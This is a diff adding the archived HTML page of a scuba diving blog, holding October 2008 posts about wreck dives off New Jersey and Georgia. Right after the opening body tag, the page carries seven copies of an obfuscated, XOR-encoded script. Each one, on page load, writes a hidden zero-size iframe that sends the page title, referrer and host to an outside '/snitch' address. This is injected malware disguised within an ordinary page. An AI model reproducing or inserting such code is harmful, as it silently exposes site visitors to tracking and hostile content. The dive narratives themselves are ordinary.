@@ -1,0 +1,412 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
+
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+<title>October &laquo; 2008 &laquo;  Go deep, stay long</title>
+
+<link rel="stylesheet" href="http://www.sjue.com/blog/wp-content/themes/inferno-mf/style.css" type="text/css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="Go deep, stay long RSS Feed" href="http://www.sjue.com/blog/feed/" />
+<link rel="alternate" type="application/atom+xml" title="Go deep, stay long Atom Feed" href="http://www.sjue.com/blog/feed/atom/" />
+<link rel="pingback" href="http://www.sjue.com/blog/xmlrpc.php" />
+
+<style type="text/css" media="screen">
+
+
+</style>
+
+
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.sjue.com/blog/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.sjue.com/blog/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.5" />
+</head>
+<body>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<div id="page">
+
+
+<div id="header">
+	<div id="headerimg">
+		<h1><a href="http://www.sjue.com/blog/">Go deep, stay long</a></h1>
+		<div class="description">SCUBA diving &amp; training in New Jersey and beyond</div>
+	</div>
+</div>
+<hr />
+
+	<div id="content" class="narrowcolumn">
+
+		
+ 	   	  		<h2 class="pagetitle">Archive for October, 2008</h2>
+ 	  
+
+		<div class="navigation">
+			<div class="alignleft"></div>
+			<div class="alignright"></div>
+		</div>
+
+				<div class="post-61 post type-post status-publish format-standard hentry category-dive-log category-technical tag-north-east-diving">
+				<h3 id="post-61"><a href="http://www.sjue.com/blog/2008/10/wreck-discovery-on-the-indepencence-ii/" rel="bookmark" title="Permanent Link to Wreck discovery on the Indepencence II">Wreck discovery on the Indepencence II</a></h3>
+				<small>Thursday, October 16th, 2008</small>
+
+				<div class="entry">
+					<p>The Independence II headed out this week on another wreck exploration trip. Captain Dan Bartone had obtained some promising hang numbers a few weeks back. They were located within a few miles of three known Black Sunday wrecks, and warranted further investigation. We&#8217;ve tried to get out a few times, but Neptune had his own ideas. This week the weather cooperated. Dan assembled some of the usual suspects (Dive Marshal Bill Trent, Richie Kohler and Dave Oldham), and headed over 50 miles offshore to check them out.</p>
+<p>We arrived to sunny skies and clear warm water. Bill and Richie jumped in and tied in to the wreck in 230 fsw. The report came back that the current was ripping the whole way down to the wreck. While Richie swam along the wreck in an attempt identify her, Bill had other priorities, and completely filling his bag with lobster. Quite literally, one more lobster, and the bag would not close.</p>
+<p>Dan and I splashed to check her out, and pull the hook. With the reports on the strong current, I opted to leave the camera topside. This was a good call, as the decent was hand over hand all the way down the line. We reached the bottom to find 40+ ft of vis, 47 degree water, and reasonably ambient light for this depth. We were tied into the bow winch with her boiler near by. What appeared to be the bowsprit could be seen a short distance off in the sand. This and other structures showed evidence that she was a sailing ship. We were not able to make it to the stern, given the current and the alloted time, but she appears to be over 150&#8242;.</p>
+<p>We were quickly out of time, and had to get back to pull the hook. Dan and I spent the next hour+ decompressing in the 65 degree water. It felt comfortable to me, but Dan had a leak in his drysuit, and was chilling quickly at 30&#8242;. We got on board and headed back home.</p>
+<table border="0" cellspacing="5" align="left">
+<tbody>
+<tr>
+<td><img src="http://sjue.com/images/0810sunset.jpg" align="left" width="400" /></td>
+</tr>
+<tr>
+<td align="center">Sunset at Clark&#8217;s</td>
+</tr>
+</tbody>
+</table>
+<p>On the way back we all discussed the nature of the wreck. She&#8217;s a low lying, wooden sailing vessel which means that identification will require some digging. Her position is within 10 miles of the charted position of three other Black Sunday wrecks. Could she be one also? Only time will tell!</p>
+<p>We arrived home to a beautiful sunset, and hot lobster dinner!</p>
+				</div>
+
+				<p class="postmetadata">Tags: <a href="http://www.sjue.com/blog/tag/north-east-diving/" rel="tag">North East diving</a><br /> Posted in <a href="http://www.sjue.com/blog/category/dive-log/" title="View all posts in Dive Log" rel="category tag">Dive Log</a>, <a href="http://www.sjue.com/blog/category/dive-log/technical/" title="View all posts in Technical Dives" rel="category tag">Technical Dives</a> |   <a href="http://www.sjue.com/blog/2008/10/wreck-discovery-on-the-indepencence-ii/#respond" title="Comment on Wreck discovery on the Indepencence II">No Comments &#187;</a></p>
+
+			</div>
+
+				<div class="post-60 post type-post status-publish format-standard hentry category-dive-log category-uwphotos tag-dive tag-north-east-diving tag-technical-dives">
+				<h3 id="post-60"><a href="http://www.sjue.com/blog/2008/10/wow-what-a-dive/" rel="bookmark" title="Permanent Link to WOW!  What a Dive!">WOW!  What a Dive!</a></h3>
+				<small>Sunday, October 12th, 2008</small>
+
+				<div class="entry">
+					<p>WOW!   Today&#8217;s dive has to go down as one of my top 10 most FANTASTIC dives.  Why?   Where to begin?   Conditions:  50 + ft of visibility.  Over 60 degrees on the bottom. Lots of ambient light. Fish almost performing for our entertainment.</p>
+<table border="0" cellspacing="2" align="right">
+<tbody>
+<tr>
+<td>[singlepic=146,400,300]</td>
+</tr>
+<tr>
+<td align="center">The bow of the Mohawk</td>
+</tr>
+</tbody>
+</table>
+<p>The Independence II headed out for a day of diving.  We decided to head for the Mohawk.   Personally, I have not been there in a while, and was looking forward to seeing the changes in the wreck.   Back when Capt Tom had the Dina Dee II up in Point Pleasant, I used to get visit this wreck regularly.   Today I saw her as never before.</p>
+<p>On the way out the we faced a stiff wind from the northeast.   NOAA was calling for 10-15, but it felt more like 20.  The Indy made short work of the chop, and we were on the wreck quickly.   Since I had come down with a cold earlier this week I asked Brandon (aka BAM, aka Dr, Capt, McNasty, aka &#8230;)  if he could tie in.  My ears were clear, but I was not sure how quickly I could descend. Brandon agreed, and had us tied in quickly.  After getting the passengers in the water, I geared up.   Just before jumping in, Brandon surfaced and reported on the excellent conditions.</p>
+<table border="0" cellspacing="2" align="left">
+<tbody>
+<tr>
+<td>[singlepic=147,400,300]</td>
+</tr>
+<tr>
+<td align="center">The Bridge stands off the bottom surrounded by fish life.</td>
+</tr>
+</tbody>
+</table>
+<p>Just as he had described, the wreck came into view at 40 ft.  I&#8217;ve been on this wreck a dozen times, but never like this!   We were tied into the stern, and I could see the divers off to toward the bow.  There was a very slight current on the bottom, so I opted to head down the starboard (leeward) side.</p>
+<p>The fish were hanging out waiting for their for their pictures to be taken.   It was clear that Fluke season was over, because they were everywhere!   Within a few feet of the anchor was a huge doormat with three others along side. (yes it&#8217;s fluke spawning season.)   Cunners, sea bass, and tog were everywhere.  Juveniles were about, and bait fish were swimming overhead.  Even a butterfly fish made an appearance.</p>
+<table border="0" cellspacing="2" align="right">
+<tbody>
+<tr>
+<td>[singlepic=148,400,300]</td>
+</tr>
+<tr>
+<td align="center">Diver passes by the a deck winch</td>
+</tr>
+</tbody>
+</table>
+<p>Evidence of the wrecks cargo was evident everywhere. Engines, tires and transmissions were clearly visible among the deck plates.  The ships winches and gear were also clearly visible.  Part of the bridge superstructure still stands behind the prominent bow.</p>
+<p>After a great dive I checked both computers to confirm two hours on the wreck.  It was time to head up.  The passengers had finished their dives, surface interval, and were now on dive two.  Brandon had joined me for the last part of my dive, and we decided that I&#8217;d pull.</p>
+<p>When everyone was on the way up, I jumped in and asked the last diver how much time he would need to hang.  Five minutes.   Dropping down, the wreck quickly came into view again.  I hovered at 60 ft and swam out a little way over the wreck.  Hanging there I was able to determine the structure of the wreck.  How the deck plates gave way to ribs and hull.   It was a wide angle view I&#8217;ve never had of this wreck.  I can only equate it to now being able to tell the forest from the trees.</p>
+<table border="0" cellspacing="2" align="right">
+<tbody>
+<tr>
+<td>[singlepic=153,400,300]</td>
+</tr>
+<tr>
+<td align="center">Engine, transmission and tires from the cargo</td>
+</tr>
+</tbody>
+</table>
+<p>There were a few minutes until the last diver would be done his hang, and this view was proving very educational.  The lesson was interrupted when I was startled by a VERY large sunfish. I&#8217;m guessing it was between 5 and 6 ft from fin tip to fin tip.  It swam right in front of me, less than 10 ft away.  I&#8217;ve seen these fish on the surface, but not on the wreck.  The big eye was definitely watching my movements which I kept to a minimum.  Slowly it swam by, then off into the distance as I regretted not having my camera.</p>
+<table border="0" cellspacing="2" align="left">
+<tbody>
+<tr>
+<td>[singlepic=154,400,300]</td>
+</tr>
+<tr>
+<td align="center">Deck Gear</td>
+</tr>
+</tbody>
+</table>
+<p>I turned my attention back to the wreck, and checked the time.  3 minutes left.   Shortly I was again startled by the large sunfish.  This time it was a bit closer, again passing by very slowly, watching my every movement.  Back to the wreck.    The next pass it became apparent that there were two sunfish of equal size.  I&#8217;d never seen them in groups, but there they were. Time was up, and it was time to pull the hook.</p>
+<p>During the task I looked up to see three sunfish lined up in formation passing within a few feet of me.   All I could figure was that they knew I didn&#8217;t have my camera, and were punishing me!   When I boarded the boat and told the story, Brandon reported that they had also seen sunfish on the surface.  Given 80 ft of depth, they probably were not the same ones, and must be traveling as a school.</p>
+<table border="0" cellspacing="2" align="right">
+<tbody>
+<tr>
+<td>[singlepic=144,400,300]</td>
+</tr>
+<tr>
+<td align="center">Brandon with gear in tow</td>
+</tr>
+</tbody>
+</table>
+<p>We packed up and headed back to port.  A great day of diving under FANTASTIC conditions.   Personally I did not want to leave.  With these condition, who wants to end the dive?</p>
+				</div>
+
+				<p class="postmetadata">Tags: <a href="http://www.sjue.com/blog/tag/dive/" rel="tag">dive</a>, <a href="http://www.sjue.com/blog/tag/north-east-diving/" rel="tag">North East diving</a>, <a href="http://www.sjue.com/blog/tag/technical-dives/" rel="tag">Technical Dives</a><br /> Posted in <a href="http://www.sjue.com/blog/category/dive-log/" title="View all posts in Dive Log" rel="category tag">Dive Log</a>, <a href="http://www.sjue.com/blog/category/uwphotos/" title="View all posts in U/W Photos" rel="category tag">U/W Photos</a> |   <a href="http://www.sjue.com/blog/2008/10/wow-what-a-dive/#comments" title="Comment on WOW!  What a Dive!">1 Comment &#187;</a></p>
+
+			</div>
+
+				<div class="post-58 post type-post status-publish format-standard hentry category-dive-log category-dive-travel tag-scuba">
+				<h3 id="post-58"><a href="http://www.sjue.com/blog/2008/10/the-devil-went-down-to-georgia-and-brought-a-rebreather/" rel="bookmark" title="Permanent Link to The devil went down to Georgia, and brought a rebreather!">The devil went down to Georgia, and brought a rebreather!</a></h3>
+				<small>Monday, October 6th, 2008</small>
+
+				<div class="entry">
+					<table border="0" cellspacing="5" align="left">
+<tbody>
+<tr>
+<td>[singlepic=158,400,300]</td>
+</tr>
+<tr>
+<td align="center">Prop and shaft</td>
+</tr>
+</tbody>
+</table>
+<p>Due to a last minute cancellation, I was able to jump on Richie Kohler’s wreck exploration trip down to Savanna Georgia. Richie and Captain Dan were the crew for the trip. The passengers included Dive Marshall Bill and myself, along with a few of Richie’s students from Canada, and Arizona. The captain was a long time local fishing operator with a long list of hang numbers from 40’ to 300’.</p>
+<p>Bill was driving down, and was kind enough to offer transportation of our gear. Since work has been nuts this last month, this allowed me a few extra days before getting underway. We met at the hotel on Friday night, and discussed the plans. We had an assortment of CCRs aboard, and a token OC diver to keep the sharks away.</p>
+<p>In this area the slope of the bottom is very shallow, even 30 miles out the depth is only 100ft. Many of the numbers were in 40 &#8211; 80 ft. At that depth, decompression is not a consideration, and in 78 degree water, hypothermia is not either. The main issue getting back to the dive shop before it closes.</p>
+<p>We loaded up the boat in the morning, and headed out towards Ossabaw Sound. The first set of number (known as secret spot 32) was not so secret. There was a local fishing tournament in progress, and the area was teaming with boats. One boat was anchored over the exact numbers. We moved far enough away to give the boat room, but still could see relief on the depth finder.  Richie dropped in to check it out. The ball started moving off then we saw the tell tail bubbles (never good). It turned out to be reef rather than a wreck. I was unaware that Georgia had reefs, but apparently they do, and this one had 20ft of relief. Personally, I would have jumped in to take some pictures, but the rest of the crew was looking for wrecks. The decision was made to head out for another set of numbers.</p>
+<table border="0" cellspacing="5" align="right">
+<tbody>
+<tr>
+<td>[singlepic=159,400,300]</td>
+</tr>
+<tr>
+<td align="center">Tied into &#8230; the anchor</td>
+</tr>
+</tbody>
+</table>
+<p>To make a long story short, we hit a number of hangs before landing on a nice wreck in 45 ft of water. Of all things, Richie had us tied into the anchor which was located next to a large boiler. The wreck was covered in sponge, hard coral, and gorgonians. Navigation was easy in the 50’ visibility. Several rows of beams headed off  toward the bow. Obviously behind the boiler was the engine prop shaft, and prop. A large school of spadefish hung just above the wreck. Barracuda were here and there, often gathering into an ominous school of their own. Within the wreck, particularly the boilers were large grouper waiting for prey. My old friends the seabass were out and about, along with a few large fluke. It was odd to see them swimming around with angle fish, and trigger fish. I expected to see a few lionfish, but there were none to be found.</p>
+<table border="0" cellspacing="5" align="left">
+<tbody>
+<tr>
+<td>[singlepic=161,400,300]</td>
+</tr>
+<tr>
+<td align="center">An ominous looking school of baracuda</td>
+</tr>
+</tbody>
+</table>
+<p>Swimming about, I found the other divers fanning in the sand near the boiler, engine and around the various wreck structures. When my camera flashed, Richie popped his head out of a cloud of silt with a brass valve in hand. Others held various pieces of porcelain and brass. I entertained myself behind the viewfinder.</p>
+<p>Up north, we don’t often get to see wrecks with this amount of light and visibility. Shallow inshore wrecks have the light, but the vis is short. Offshore, deep wrecks have the vis, but there is little ambient light. This was a nice compromise, and I wanted to take advantage of it. The school of spadefish seemed willing to paint a picturesque background for most of the shots. The Barracuda also appeared willing to add to the shots subject matter. This was good, as the divers were too busy to model.<br />
+<table border="0" cellspacing="5" align="right">
+<tbody>
+<tr>
+<td>[singlepic=166,400,300]</td>
+</tr>
+<tr>
+<td align="center">A school of spadefish paint a backdrop</td>
+</tr>
+</tbody>
+</table>
+<p>At the allotted time, we started up, and back to the dock. Plans were made for the next day. We cleaned our gear, and headed to bed. It had been a long day.</p>
+<p>The offshore forecast was not cooperating, so the next morning we boarded the boat and headed north to Hilton Head. There was an inshore wreck there reported to be producing china and bottles. Upon arrival, Richie jumped in to tie us in. Again this was a shallow wreck at 30 ft with about 15 ft of relief. Had it been in the channel, it would have been a hazard to navigation. We let the other passengers clear the deck, then geared up and splashed.</p>
+<p>According to Richie, we were tied into a winch at the bow. I’ll take his word for it, as I could not identify much. The visibility was varied anywhere from 2 feet to 2 inches. The skin of the ship was clear, as were the massive boilers and engine. I tried to find my way back to the props, but was unable to navigate clearly. I kept ending up back at the up line. I tried going along the skin of the ship, but kept finding myself in washouts in pitch black. (Pitch black, and 2 ft of vis is not my idea of fun.) Then I tried to go along the top of the vessel. Here there was light, and lots of spadefish. After passing the boilers, and what appeared to be the engine, I was be back over sand again.</p>
+<table border="0" cellspacing="5" align="left">
+<tbody>
+<tr>
+<td>[singlepic=168,400,300]</td>
+</tr>
+<tr>
+<td align="center">A toadfish I think</td>
+</tr>
+</tbody>
+</table>
+<p>After the fourth attempt to find the stern, I heard the worst sound a diver can experience, the boats engines (never good). The engine pattern did not sound like a recall. Perhaps a diver had come up down current, and the boat had to go after him. This would mean that they would go off, then come back and shut down. I reeled in the line slowly heading back. By the time I reached the up line, it was clear that something was wrong. The engines had been running too long. It was also clear that there was no tension on the up-line.</p>
+<p>I ascended to find the boat a short way off, the line had parted, and they were adrift. Once I was on the surface they threw me a line, which I quickly attached to the up-line, handed back up. I swam off and waited for the engines to shutdown. Once onboard, Dan explained the details of the incident.</p>
+<p>Richie had used a Polypropylene (poly) line for the tie in rather than the standard nylon. Poly line has some advantages in price, and the fact that it floats. On the other hand it does not stretch like nylon, is not as abrasion resistant as nylon, and does not have the strength of nylon. Elastic stretch is good for an anchor line as it absorbs the stress of boat pitching up and down in the waves. In these rough conditions the line had overstressed and chaffed at the bow cleat, and snapped. Lesson learned.</p>
+<p>The last few divers eventually appeared. They had varying degrees of success in the hunt for bottles and glassware. None had paid much attention to the sound of the engines.</p>
+<p>We strapped down for the trip back to Georgia, and then broke out lunch and hops infused beverages. Richie presented an antique bottle to the captain, who mentioned mounting it with a plaque about “when the rebreathers came to town”.</p>
+<p>With the weather picking up, Bill decided to head down to Ginny Springs for a few cave dives. some of the group decided to join him.  However, work was calling so Captain Dan and I opted to head home. Back to those NJ wrecks.</p>
+
+				</div>
+
+				<p class="postmetadata">Tags: <a href="http://www.sjue.com/blog/tag/scuba/" rel="tag">SCUBA</a><br /> Posted in <a href="http://www.sjue.com/blog/category/dive-log/" title="View all posts in Dive Log" rel="category tag">Dive Log</a>, <a href="http://www.sjue.com/blog/category/dive-log/dive-travel/" title="View all posts in Dive Travel" rel="category tag">Dive Travel</a> |   <a href="http://www.sjue.com/blog/2008/10/the-devil-went-down-to-georgia-and-brought-a-rebreather/#comments" title="Comment on The devil went down to Georgia, and brought a rebreather!">2 Comments &#187;</a></p>
+
+			</div>
+
+		
+		<div class="navigation">
+			<div class="alignleft"></div>
+			<div class="alignright"></div>
+		</div>
+	
+	</div>
+
+	<div id="sidebar">
+		<ul>
+			<li id="categories-2" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>		<ul>
+	<li class="cat-item cat-item-3"><a href="http://www.sjue.com/blog/category/dive-log/" title="Just some fun diving. ">Dive Log</a>
+<ul class='children'>
+	<li class="cat-item cat-item-5"><a href="http://www.sjue.com/blog/category/dive-log/dive-travel/" title="View all posts filed under Dive Travel">Dive Travel</a>
+</li>
+	<li class="cat-item cat-item-17"><a href="http://www.sjue.com/blog/category/dive-log/instruction/" title="My turn to teach.">Instruction</a>
+</li>
+	<li class="cat-item cat-item-28"><a href="http://www.sjue.com/blog/category/dive-log/nediving/" title="View all posts filed under North East Diving">North East Diving</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://www.sjue.com/blog/category/dive-log/technical/" title="View all posts filed under Technical Dives">Technical Dives</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://www.sjue.com/blog/category/dive-log/training/" title="View all posts filed under Training">Training</a>
+</li>
+</ul>
+</li>
